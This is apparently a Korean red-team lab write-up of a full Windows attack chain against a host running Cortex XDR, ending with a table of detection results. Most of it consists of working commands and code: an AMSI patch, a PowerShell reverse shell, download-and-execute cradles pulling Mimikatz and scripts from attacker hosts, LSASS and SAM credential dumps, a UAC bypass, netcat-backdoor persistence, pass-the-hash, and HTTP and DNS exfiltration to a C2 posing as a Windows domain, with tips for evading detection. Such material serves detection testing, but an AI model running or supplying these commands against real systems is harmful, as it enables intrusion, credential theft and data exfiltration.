# Windows 공격 체인 — 상세 분석

> **환경**: Windows 11 · Cortex XDR 에이전트 설치  
> **호스트명**: `<WINDOWS_HOSTNAME>` / `<WINDOWS_IP>`  
> **공격자 (Kali)**: `<KALI_IP>` · **C2 서버**: `<C2_IP>`  
> **목표**: 초기 접근 → 관리자 권한 획득 → 후속 공격 6개 브랜치

---

## 공격 흐름 요약

```
[RECON]       Nmap / SMB 열거로 서비스 파악
    │
    ▼
[INIT ACCESS] WinRM 브루트포스 → Evil-WinRM으로 PowerShell 쉘 획득
    │
    ▼
[AMSI BYPASS] PowerShell 탐지 우회 (메모리 패치)
    │
    ▼
[EXECUTION]   PowerShell 리버스쉘 / Mimikatz 메모리 로드
    │
    ▼
[CRED DUMP]   Mimikatz로 NTLM 해시, 평문 패스워드 덤프
    │
    ├─▶ [TOKEN]   토큰 탈취 → SYSTEM 권한
    ├─▶ [PERSIST] 레지스트리/서비스/스케줄 작업 백도어
    ├─▶ [LOLBIN]  certutil/bitsadmin/mshta 악용
    ├─▶ [DATA]    하드코딩 크레덴셜, 브라우저 패스워드
    ├─▶ [LATERAL] Pass-the-Hash로 내부 서버 이동
    └─▶ [EXFIL]   HTTP / DNS 유출
```

---

## 1단계 — 정찰 (Reconnaissance)
**MITRE**: T1595, T1046, T1135

---

### 기법 1 — 포트 스캔

```bash
nmap -sV -p 445,3389,5985,5986 <target>
```

Windows 주요 포트만 빠르게 확인:

| 포트 | 서비스 | 의미 |
|------|--------|------|
| 445 | SMB | 파일 공유, 원격 실행 가능 |
| 3389 | RDP | 원격 데스크톱 |
| 5985 | WinRM (HTTP) | PowerShell 원격 실행 |
| 5986 | WinRM (HTTPS) | PowerShell 원격 실행 (암호화) |

---

### 기법 2 — SMB 열거

```bash
enum4linux -a <target>
```

**SMB(Server Message Block)**: Windows 파일 공유 프로토콜.  
`enum4linux`로 인증 없이(익명으로) 가져올 수 있는 정보를 전부 수집:

```
사용자 목록:  administrator, guest, john, mary
공유 폴더:   \\target\IPC$, \\target\ADMIN$, \\target\C$
도메인 정보: WORKGROUP
패스워드 정책: 최소 길이 0 (취약!)
```

---

### 기법 3 — NetBIOS/SMB 스크립트 열거

```bash
nmap --script smb-enum-shares,smb-enum-users <target>
```

Nmap 내장 스크립트로 더 상세한 SMB 정보 수집.  
`smb-enum-shares`: 공유 폴더 목록  
`smb-enum-users`: 사용자 계정 목록

---

### 기법 4 — WinRM 확인

```bash
nmap -p 5985,5986 <target>
```

WinRM 포트가 열려있으면 **Evil-WinRM으로 PowerShell 쉘 획득** 시도 가능.

---

## 2단계 — 초기 접근 (Initial Access)
**MITRE**: T1021.006, T1110.001

---

### 기법 5 — WinRM 브루트포스

```bash
netexec winrm <target> -u users.txt -p pass.txt --local-auth 2>&1 | grep -v "Cryptography\|arc4"
```

**NetExec(nxc)**: CrackMapExec의 후속 툴 (crackmapexec deprecated).  
`--local-auth` 플래그 필수 — 로컬 administrator 계정 인증 시 반드시 추가.

```
WINRM  target  5985  administrator  Password1!  [+] 인증 성공 (Pwn3d!)
```

---

### 기법 6 — WinRM 명령 실행 (netexec)

```bash
# PowerShell 명령 (-X)
netexec winrm <target> -u administrator -p 'Password1!' --local-auth \
  -X "whoami; hostname; ipconfig" 2>&1 | grep -v "Cryptography\|arc4"

# cmd 명령 (-x)
netexec winrm <target> -u administrator -p 'Password1!' --local-auth \
  -x "whoami /all" 2>&1 | grep -v "Cryptography\|arc4"
```

> ⚠️ **`evil-winrm` 대화형 셸은 MCP/자동화 환경에서 사용 불가**.  
> `-X` (PowerShell 실행), `-x` (cmd 실행) 패턴으로 명령 전달.

**Linux의 SSH 접속과 같은 개념**. 단지 프로토콜이 WinRM이고 쉘이 PowerShell인 것.

---

### 기법 7 — SMB 인증

```bash
smbclient //<target>/C$ -U administrator
```

SMB로 C 드라이브에 파일 시스템 접근.  
파일 업로드/다운로드, 악성 파일 배포에 사용.

---

## 3단계 — AMSI 우회 (Defense Evasion)
**MITRE**: T1562.001

**AMSI(Antimalware Scan Interface)**: Microsoft가 만든 악성 스크립트 실시간 검사 기능.  
PowerShell 명령어 실행 전 백신/EDR에 "이거 악성이야?" 물어보는 검문소.

AMSI를 우회하지 않으면 Mimikatz 같은 공격 도구가 실행 즉시 차단됨.

---

### 기법 8 — AMSI 메모리 패치

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)
```

**원리**:
- PowerShell은 .NET 런타임 위에서 동작
- AMSI도 같은 프로세스(powershell.exe) 안에 로드된 DLL
- **.NET Reflection**으로 AMSI 내부 변수에 직접 접근 가능
- `amsiInitFailed = true`로 변조 → "AMSI 초기화 실패" 상태로 속임 → 검사 건너뜀

```
powershell.exe 프로세스
├── AMSI DLL (amsiInitFailed = false) ← 정상
│        ↓ [Reflection으로 변조]
└── AMSI DLL (amsiInitFailed = true)  ← 검사 비활성화
```

**왜 탐지 어려우냐**: 파일 없음, 정상 .NET 기능 사용, 메모리에만 존재.

---

### 기법 9 — Script Block 로깅 비활성화

```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    -Name "EnableScriptBlockLogging" -Value 0
```

**Script Block 로깅**: PowerShell이 실행한 모든 코드를 Windows 이벤트 로그에 기록하는 기능.  
이걸 끄면 어떤 명령어를 실행했는지 로그에 남지 않음 → 포렌식/탐지 회피.

---

### 기법 10 — PowerShell 버전 다운그레이드

```powershell
powershell -version 2 -c <payload>
```

**PowerShell v2는 AMSI가 없음** (너무 오래된 버전, AMSI 도입 전).  
v5에서 탐지되더라도 v2로 실행하면 검사 없이 통과.  
Windows에 v2가 아직 남아있는 경우 그대로 사용 가능.

---

### 기법 11 — Base64 인코딩 실행

```powershell
powershell -EncodedCommand <base64문자열>
```

명령어를 Base64로 인코딩해서 실행.  
시그니처 기반 탐지는 "mimikatz", "sekurlsa" 같은 문자열을 탐지하는데, 인코딩하면 원본 문자열이 보이지 않음.

```
원본: Invoke-Mimikatz -Command sekurlsa::logonpasswords
인코딩: SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA...
```

---

## 4단계 — 실행 (Execution)
**MITRE**: T1059.001

---

### 기법 12 — PowerShell 리버스쉘

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<attacker>', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
while($true) {
    $writer.Write("PS> ")
    $writer.Flush()
    $cmd = $reader.ReadLine()
    $output = Invoke-Expression $cmd 2>&1
    $writer.WriteLine($output)
    $writer.Flush()
}
```

- `TCPClient`: Windows가 공격자 서버로 먼저 TCP 연결
- `StreamWriter/Reader`: 그 연결로 명령어 입출력
- `Invoke-Expression`: 받은 문자열을 PowerShell 명령어로 실행

**리눅스의 `bash -i >& /dev/tcp/...`와 같은 개념**, Windows PowerShell 버전.

---

### 기법 13 — Invoke-Mimikatz 메모리 로드

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')
```

| 부분 | 의미 |
|------|------|
| `Net.WebClient` | 웹 요청 객체 |
| `.DownloadString(url)` | URL에서 스크립트 텍스트 다운로드 |
| `IEX` (Invoke-Expression) | 받은 문자열을 코드로 즉시 실행 |

**Invoke-Mimikatz.ps1 구성**:
```
1. mimikatz.exe 전체가 바이트 배열로 인코딩되어 포함
   [Byte[]] $PEBytes64 = @(0x4d,0x5a,0x90,0x00...)
             ↑ 0x4d,0x5a = "MZ" = Windows 실행파일 시그니처

2. PE 인젝터: 바이트 배열을 메모리에 올려서 실행하는 로더

3. PowerShell 인터페이스: 명령어 전달, 결과 출력
```

**핵심**: **파일을 디스크에 한 번도 쓰지 않음** → 파일 기반 백신 탐지 불가 (Fileless 공격)

---

### 기법 14 — Shellcode Injection

```powershell
# 1. 실행 가능한 메모리 할당
$mem = [Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)

# 2. 셸코드를 그 메모리에 복사
[Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)

# 3. 메모리에서 직접 실행
$func = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, ...)
$func.Invoke()
```

**셸코드(Shellcode)**: 기계어로 작성된 악성 코드 바이트.  
EXE 파일 없이 메모리에 직접 기계어를 올려서 실행. 완전한 Fileless 공격.

```
$buf = [바이트 배열]   → 메모리 할당 → 복사 → 실행
디스크 파일 = 없음
```

---

## 5단계 — 자격증명 덤프 (Credential Dumping)
**MITRE**: T1003.001, T1003.002

---

### 기법 15 — SAM 하이브 덤프 (reg save)

```powershell
# reg save로 SAM/SYSTEM/SECURITY 하이브 덤프
netexec winrm <target> -u administrator -p 'Password1!' --local-auth -X "
reg save HKLM\SAM C:\Windows\Temp\sam.bak /y
reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak /y
reg save HKLM\SECURITY C:\Windows\Temp\sec.bak /y
Write-Host 'SAM_HIVE_DUMP_COMPLETE'"

# SMB로 Kali에 다운로드
smbclient //<target>/C$ -U 'administrator%Password1!' \
  -c "get Windows\Temp\sam.bak /tmp/sam.bak; \
      get Windows\Temp\sys.bak /tmp/sys.bak; \
      get Windows\Temp\sec.bak /tmp/sec.bak"

# impacket-secretsdump로 오프라인 추출
impacket-secretsdump -sam /tmp/sam.bak -system /tmp/sys.bak -security /tmp/sec.bak LOCAL
```

**실제 추출된 NTLM 해시 (<WINDOWS_HOSTNAME>)**:
```
Administrator:500:<LM_HASH>:<ADMIN_NTLM_HASH>:::
Song:1001:...:<USER1_NTLM_HASH>:::
mitre:1005:...:<USER2_NTLM_HASH>:::
remote:1006:...:<USER3_NTLM_HASH>:::
```

---

### 기법 16 — LSASS 메모리 덤프 (comsvcs.dll)

```bash
# 1. LSASS PID 확인
netexec winrm <target> -u administrator -p 'Password1!' --local-auth \
  -x "for /f %p in ('tasklist /fi \"imagename eq lsass.exe\" /fo csv /nh') do @echo LSASS=%p"

# 2. comsvcs.dll MiniDump으로 LSASS 덤프 (추가 도구 불필요 — LOLBin)
netexec winrm <target> -u administrator -p 'Password1!' --local-auth \
  -x "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full"
```

> `procdump.exe` 없이 Windows 기본 내장 `comsvcs.dll`로 덤프 가능 (LOLBin).  
> `$pid`는 PowerShell 예약 변수라 `$lsassPid` 등 다른 변수명 사용.

```
[타겟 서버]                          [공격자 서버]
comsvcs.dll → lsass.dmp              SMB로 다운로드 후
                  │                  impacket-secretsdump로 오프라인 분석
                  └──────────────▶   secrets 추출
```

---

### 기법 17 — SAM 하이브 덤프

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

**SAM(Security Account Manager)**: 로컬 계정의 패스워드 해시 저장 데이터베이스.

```bash
# 공격자 서버에서
secretsdump.py -sam sam.hive -system system.hive LOCAL
# 결과: administrator:500:해시값:해시값:::
```

---

### 기법 18 — DCSync (도메인 환경)

```
mimikatz# lsadump::dcsync /user:krbtgt
```

**DCSync**: 자신을 도메인 컨트롤러인 척하여 AD의 패스워드 해시를 복제(Sync) 요청.  
실제 DC에 접근하지 않아도 도메인 전체 계정 해시 획득 가능.

**krbtgt**: Kerberos 티켓 발급에 사용되는 도메인 핵심 계정.  
이 해시 획득 → **Golden Ticket 공격** 가능 → 도메인 영구 장악.

---

## 6-A단계 — 토큰 탈취 / 권한 상승
**MITRE**: T1134, T1548.002

---

### 기법 19 — 토큰 열거

```cmd
whoami /priv
```

현재 프로세스가 가진 **Windows 권한(Privilege) 목록** 확인.

```
SeImpersonatePrivilege    ← 있으면 SYSTEM 탈취 가능!
SeDebugPrivilege          ← LSASS 접근 가능
SeBackupPrivilege         ← 파일 시스템 제한 우회
```

---

### 기법 20 — 토큰 Impersonation

```
mimikatz# token::elevate /domainadmin
```

**Token Impersonation**: 다른 사용자의 접근 토큰을 탈취해서 그 권한으로 행동.  
예) IIS, SQL Server 서비스 계정 토큰 탈취 → 해당 계정 권한으로 명령 실행.

---

### 기법 21 — UAC 우회 (fodhelper)

```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
fodhelper.exe
```

**UAC(User Account Control)**: 관리자 권한 작업 시 "허용하시겠습니까?" 팝업.

**fodhelper.exe**: Windows 설정 앱의 일부. 자동으로 UAC 없이 높은 권한으로 실행됨 (autoelevate).

**원리**:
```
1. fodhelper.exe가 실행 시 레지스트리 키 참조
2. HKCU(현재 사용자)의 레지스트리는 관리자 권한 없이 수정 가능
3. 해당 키에 cmd.exe 등록
4. fodhelper.exe 실행 → 등록된 cmd.exe를 높은 권한으로 실행
```

---

### 기법 22 — PrintSpoofer (SYSTEM 탈취)

```cmd
PrintSpoofer.exe -i -c cmd
```

**PrintSpoofer**: `SeImpersonatePrivilege` 권한을 이용해 SYSTEM 권한을 탈취하는 툴.

**원리**:
1. Windows 프린터 스풀러 서비스를 속임
2. SYSTEM 권한의 Named Pipe 연결 유도
3. 해당 연결 토큰을 탈취
4. SYSTEM 권한으로 cmd 실행

---

## 6-B단계 — 지속성 (Persistence)
**MITRE**: T1547.001, T1543.003

---

### 기법 23 — 레지스트리 Run 키

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    /v backdoor /d "C:\Windows\Temp\nc.exe <ip> 4444 -e cmd"
```

**Run 키**: Windows 시작 시 자동으로 실행되는 프로그램 목록.

```
Windows 부팅
    ↓
레지스트리 Run 키 읽기
    ↓
nc.exe 자동 실행 → 공격자한테 역방향 연결
```

---

### 기법 24 — 서비스 등록

```cmd
sc create BackdoorSvc binpath="C:\Windows\Temp\shell.exe" start=auto
sc start BackdoorSvc
```

**Windows 서비스**: 백그라운드에서 계속 실행되는 프로세스.  
`start=auto` = 부팅 시 자동 시작.

일반 프로세스보다 눈에 덜 띄고, 관리자가 종료해도 서비스 재시작 가능.

---

### 기법 25 — 스케줄된 작업

```cmd
schtasks /create /tn "Updater" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM
```

| 옵션 | 의미 |
|------|------|
| `/tn "Updater"` | 작업 이름 (정상처럼 보이게) |
| `/sc minute /mo 5` | 5분마다 실행 |
| `/ru SYSTEM` | SYSTEM 권한으로 실행 |

Cron 백도어의 Windows 버전.

---

### 기법 26 — WMI 이벤트 구독

```powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription ...
$consumer = Set-WmiInstance -Class CommandLineEventConsumer ...
Set-WmiInstance -Class __FilterToConsumerBinding ...
```

**WMI(Windows Management Instrumentation)**: Windows 시스템 관리 인프라.  
특정 이벤트(부팅, 로그인, 프로세스 시작 등) 발생 시 자동으로 명령 실행.

가장 탐지하기 어려운 지속성 기법 중 하나.

---

## 6-C단계 — LOLBin 악용
**MITRE**: T1218, T1197

---

### 기법 27 — certutil 다운로드

```cmd
certutil -urlcache -split -f http://<attacker>/payload.exe C:\Temp\p.exe
```

**certutil**: 원래 인증서 관리 도구. Microsoft 서명된 정상 시스템 파일.  
`-urlcache` 옵션으로 URL에서 파일 다운로드 가능 → **백신이 차단 못함**.

---

### 기법 28 — bitsadmin 다운로드

```cmd
bitsadmin /transfer job http://<attacker>/file.exe C:\Temp\file.exe
```

**BITS(Background Intelligent Transfer Service)**: Windows Update 등에 사용되는 백그라운드 파일 전송 서비스.  
정상 Windows 기능이라 탐지 어려움.

---

### 기법 29 — mshta.exe 실행

```cmd
mshta.exe http://<attacker>/payload.hta
```

**mshta.exe**: HTA(HTML Application) 실행 파일. 원격 URL에서 HTA를 받아 실행 가능.  
HTA는 VBScript/JScript를 전체 권한으로 실행할 수 있어 매우 위험.

---

### 기법 30 — regsvr32 (Squiblydoo)

```cmd
regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll
```

**regsvr32**: DLL 등록 도구. 원격 스크립트를 다운받아 실행 가능.  
프록시나 방화벽 우회 가능. AppLocker 우회 가능.

---

## 6-D단계 — 데이터 수집
**MITRE**: T1005, T1552.001

---

### 기법 31 — 하드코딩 크레덴셜 탐색

```cmd
findstr /si "password" *.txt *.xml *.config
```

| 옵션 | 의미 |
|------|------|
| `/s` | 하위 디렉토리 포함 |
| `/i` | 대소문자 무시 |

설정 파일, 소스코드, 배포 파일에 패스워드가 평문으로 있는 경우를 탐색.

---

### 기법 32 — 브라우저 패스워드 (DPAPI)

```cmd
SharpDPAPI.exe triage
```

**DPAPI(Data Protection API)**: Windows의 데이터 암호화 API.  
Chrome, Edge 등 브라우저가 저장 패스워드를 DPAPI로 암호화.  
로그인한 계정 권한으로 복호화 가능 → 모든 저장 패스워드 평문으로 추출.

---

## 6-E단계 — 내부망 이동 (Lateral Movement)
**MITRE**: T1550.002, T1021.002

---

### 기법 34 — Pass-the-Hash (PtH)

```bash
netexec smb <target> -u administrator -H <ADMIN_NTLM_HASH> --local-auth \
  2>&1 | grep -v "Cryptography\|arc4"
# [+] <WINDOWS_HOSTNAME>\administrator:7facdc498... (Pwn3d!) 확인
```

**Pass-the-Hash**: 평문 패스워드 없이 **NTLM 해시만으로 인증**.

**원리**:
```
일반 인증:
  패스워드 입력 → 해시 생성 → 서버에 전송 → 검증

PtH:
  해시를 직접 전송 → 검증 통과
  (패스워드를 알 필요 없음)
```

Mimikatz로 해시를 덤프했다면 크랙 없이 바로 다른 서버에 로그인 가능.

---

### 기법 35 — PsExec (SMB + PtH)

```bash
netexec smb <target> -u administrator -H <ADMIN_NTLM_HASH> --local-auth \
  -x "whoami && hostname" 2>&1 | grep -v "Cryptography\|arc4"
```

**PsExec**: SMB를 통해 원격으로 명령 실행. PtH 방식으로 인증.  
원격 서버에 SYSTEM 권한 쉘 획득 가능.

---

### 기법 36 — WMI 원격 실행

```cmd
wmic /node:<target> /user:admin /password:pass process call create "cmd.exe /c ..."
```

WMI를 통한 원격 프로세스 실행. 이벤트 로그에 덜 기록됨.

---

## 6-F단계 — 데이터 유출 (Exfiltration)
**MITRE**: T1048.003

---

### 기법 37 — HTTP 업로드

```powershell
Invoke-RestMethod -Uri "http://<C2_IP>:8080/upload" -Method POST -InFile C:\Temp\loot.zip
```

일반 HTTP 트래픽으로 위장한 파일 업로드. 포트 80/443이 열려있을 때 사용.

---

### 기법 38 — DNS 파일 유출 (C2 서버 연동)

> **실제 연동 C2**: `<C2_IP>` · 도메인: `telemetry.windows-cdn.net`  
> **결과 확인**: `http://<C2_IP>:8080` → 세션 선택 → **유출 파일** 탭

```powershell
# exfil_dns.ps1 을 Windows 타겟으로 전달 후 실행
powershell -ExecutionPolicy Bypass -File exfil_dns.ps1
```

---

#### 📌 왜 DNS인가?

| 방법 | 차단 가능성 | 이유 |
|------|-----------|------|
| HTTP(S) POST | 높음 | 프록시/방화벽이 외부 URL 필터링 |
| SMB/FTP | 높음 | 포트 차단, 보안장비 탐지 |
| **DNS 쿼리** | **낮음** | 인터넷 접속을 위해 UDP 53 반드시 열려있어야 함 |

DNS는 인터넷 기본 인프라이므로 방화벽에서 막으면 인터넷 자체가 안 됨.  
→ **공격자는 이 특성을 이용해 데이터를 DNS 쿼리 이름에 숨겨 전송**

---

#### 🔧 exfil_dns.ps1 동작 원리

```
loot.zip (바이너리) 
  │
  ▼ Base32 인코딩 (ASCII 안전 문자만 사용, DNS 레이블 규격 준수)
KRUGKIDROVUWG2ZAMJZG653OEBTG66BANJ2W24DTEBXXMZLS...
  │
  ▼ 40자 단위로 청크 분할
[청크 0] KRUGKIDROVUWG2ZAMJZG
[청크 1] 653OEBTG66BANJZW24DT  
[청크 2] EBXXMZLSEB3GK4TPNFZX
  ...
  │
  ▼ DNS A 쿼리로 전송 (UDP 53 → <C2_IP>)
f.{세션ID}.{파일명B32}.{총청크수}.{인덱스}.{청크데이터}.telemetry.windows-cdn.net
```

**실제 전송되는 DNS 쿼리 예시:**
```
f.ac109dbb.MRSWC.10.0.KRUGKIDROVUWG2ZAMJZG.telemetry.windows-cdn.net → A 쿼리
f.ac109dbb.MRSWC.10.1.653OEBTG66BANJZW24DT.telemetry.windows-cdn.net → A 쿼리
f.ac109dbb.MRSWC.10.2.EBXXMZLSEB3GK4TPNFZX.telemetry.windows-cdn.net → A 쿼리
  ...
```

| 레이블 | 값 예시 | 의미 |
|--------|---------|------|
| `f` | `f` | 파일 유출 쿼리 식별자 |
| `{세션ID}` | `ac109dbb` | 클라이언트 IP를 hex 변환한 값 |
| `{파일명B32}` | `MRSWC` | `loot.zip` → Base32 인코딩 |
| `{총청크수}` | `10` | 전체 청크 개수 |
| `{인덱스}` | `0~9` | 현재 청크 번호 |
| `{청크데이터}` | `KRUGK...` | 파일 바이너리의 Base32 조각 |

---

#### 🖥️ C2 서버 수신 흐름 (<C2_IP>)

```
Windows 타겟                          <C2_IP> (DNS :53)
───────────────────────────────────────────────────────────►
f.ac109dbb.MRSWC.10.0.KRUGK....telemetry.windows-cdn.net
f.ac109dbb.MRSWC.10.1.653OE....telemetry.windows-cdn.net
f.ac109dbb.MRSWC.10.2.EBXXM....telemetry.windows-cdn.net
  ... (총 10개 쿼리)

                                      모든 청크 수신 완료 시:
                                      Base32 조각 이어붙이기
                                            │
                                      Base32 디코딩 → 바이너리 복원
                                            │
                                      exfil_store에 저장
                                            │
                              http://<C2_IP>:8080
                              → [유출 파일] 탭에서 확인 + 다운로드
```

---

#### ⚙️ 실행 절차 (실제 공격 시나리오)

**Step 1 — loot.zip 준비 (앞선 단계에서 수집한 파일 패키징)**

```powershell
# 기법 29~36에서 덤프한 파일들을 하나로 압축
Compress-Archive -Path C:\Temp\sam.hive, C:\Temp\system.hive, `
  C:\Temp\ntds.dit, C:\Temp\creds.txt `
  -DestinationPath C:\Temp\loot.zip -Force
```

**Step 2 — exfil_dns.ps1 전달 방법 (타겟엔 파일이 없으므로)**

공격자 서버(`<C2_IP>:8080`)가 스크립트를 HTTP로 서빙함.  
Evil-WinRM 쉘 또는 획득한 PowerShell 세션에서 **메모리에 직접 로드**:

```powershell
# ── 방법 A: IEX 메모리 실행 (Fileless, 디스크에 흔적 없음) ──
IEX (New-Object Net.WebClient).DownloadString('http://<C2_IP>:8080/exfil_dns.ps1')
```

```bash
# ── 방법 B: Evil-WinRM upload 명령으로 파일 전송 ──
# Kali 터미널에서
*Evil-WinRM* PS C:\Temp> upload /root/exfil_dns.ps1 C:\Temp\exfil_dns.ps1
*Evil-WinRM* PS C:\Temp> powershell -ExecutionPolicy Bypass -File C:\Temp\exfil_dns.ps1
```

> **방법 A 권장**: 디스크에 파일이 저장되지 않아 포렌식·XDR 탐지 회피에 유리  
> 단, HTTP 통신이 가능한 환경이어야 함 (DNS만 열린 환경이면 방법 B 사용)

**실행 시 콘솔 출력:**
```
[*] DNS 파일 유출 시작
[*] 대상 파일 : C:\Temp\loot.zip
[*] C2 서버   : <C2_IP>
[*] 도메인    : telemetry.windows-cdn.net

[*] 파일명  : loot.zip
[*] 파일크기: 48293 bytes
[*] 총 청크 : 1289 개
[*] 세션 ID : ac109dbb

[*] 전송 중... 1289/1289 (100%)

[+] 유출 완료!
    파일    : loot.zip
    크기    : 48293 bytes
    소요시간: 65초
    확인    : http://<C2_IP>:8080 → 세션 선택 → Files 탭
```

**Step 3 — C2 웹 UI에서 수신 확인**

`http://<C2_IP>:8080` 접속 → 세션 선택 → **유출 파일** 탭

```
┌─────────────────────────────────────────────────────────┐
│  🗜️  loot.zip                               47.2 KB     │
│      수신: 14:32:17 · DNS 터널링 via port 53   [⬇ 다운로드] │
└─────────────────────────────────────────────────────────┘
```

---

#### 🔍 탐지 어려운 이유

| 탐지 시도 | 한계 |
|---------|------|
| 방화벽 UDP 53 차단 | DNS가 안 되면 인터넷 자체 불통 → 실제 차단 불가 |
| DNS 쿼리 로깅 | 쿼리 이름이 암호화된 문자열처럼 보여 육안 식별 어려움 |
| 도메인 블랙리스트 | `telemetry.windows-cdn.net` → Windows 정상 트래픽처럼 위장 |
| 트래픽 볼륨 분석 | 청크당 40자 / 50ms 간격 → 느리고 분산된 쿼리라 임계치 미달 |

**XDR 탐지 시그니처 (Cortex XDR):**  
비정상적으로 긴 서브도메인 쿼리 반복 → **DNS 터널링 의심 알림 발생**

---

## XDR 탐지 결과 요약

| 공격 단계 | 탐지 | 탐지 규칙 |
|---------|------|---------|
| WinRM 브루트포스 | ✅ | 짧은 시간 내 다수 인증 실패 |
| AMSI 메모리 패치 | ✅ | AmsiUtils 메모리 변조 패턴 |
| PowerShell 다운로드 실행 (IEX) | ✅ | 외부 URL에서 스크립트 로드 + 실행 |
| Mimikatz 실행 | ✅ | 알려진 시그니처 + sekurlsa 명령어 |
| LSASS 메모리 접근 | ✅ | 비정상 프로세스의 LSASS 접근 |
| Run 레지스트리 키 생성 | ✅ | 자동 시작 항목 등록 |
| 서비스 등록 (BackdoorSvc) | ✅ | 신규 서비스 생성 |
| Pass-the-Hash | ✅ | 해시 기반 비정상 인증 패턴 |
| certutil 원격 다운로드 | ⚠️ | LOLBin 의심 행위 (부분 탐지) |
| PrintSpoofer | ✅ | 권한 상승 시도 |
| DNS 유출 | ⚠️ | 비정상 DNS 쿼리 패턴 (부분 탐지) |
